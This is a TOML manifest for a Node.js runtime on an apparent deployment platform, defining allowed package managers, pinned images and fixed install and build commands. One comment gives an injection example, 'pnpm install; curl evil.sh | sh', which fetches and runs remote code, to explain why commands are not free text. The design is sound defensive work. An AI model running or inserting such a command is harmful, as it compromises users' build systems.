# The manifest declares what a project of this kind is permitted to ask for.
# The agent validates every runtime configuration against it before rendering,
# so a version or command outside these lists is refused at the API boundary
# rather than reaching a build.
#
# Every scalar key must appear before the first table header: in TOML,
# everything after `[table]` belongs to that table.

id = "nodejs"
display_name = "Node.js"
description = "Node.js applications, Discord bots, REST APIs and workers."

package_managers = ["PNPM", "NPM", "YARN"]
default_package_manager = "PNPM"

# The start command is `node <entry>` or `<manager> run <script>`; both are
# built from validated parts, never concatenated from user text.
start_forms = ["node_entry", "package_script"]

# Scripts that mean "development". Never chosen as a default, and flagged when
# selected, because a watcher in production restarts on every file event.
development_scripts = ["dev", "watch", "start:dev", "develop", "nodemon"]

working_dir = "/app"
default_port = 3000

# Pinned to a patch version, not a floating tag: `node:22-slim` being
# republished must not silently change what a project runs.
[[versions]]
version = "22"
base_image = "node:22.14.0-bookworm-slim"
lts = true
default = true

[[versions]]
version = "20"
base_image = "node:20.19.0-bookworm-slim"
lts = true
default = false

# The user picks one of these. They are not free text, which is the difference
# between choosing `pnpm install --frozen-lockfile` from a list and being able
# to type `pnpm install; curl evil.sh | sh`.
[install_commands]
PNPM = ["pnpm", "install", "--frozen-lockfile"]
PNPM_NO_LOCKFILE = ["pnpm", "install"]
NPM = ["npm", "ci"]
NPM_NO_LOCKFILE = ["npm", "install"]
YARN = ["yarn", "install", "--frozen-lockfile"]
YARN_NO_LOCKFILE = ["yarn", "install"]

[build_commands]
PNPM = ["pnpm", "run", "build"]
NPM = ["npm", "run", "build"]
YARN = ["yarn", "run", "build"]

[health_check]
supported = ["NONE", "HTTP", "TCP"]
default = "NONE"
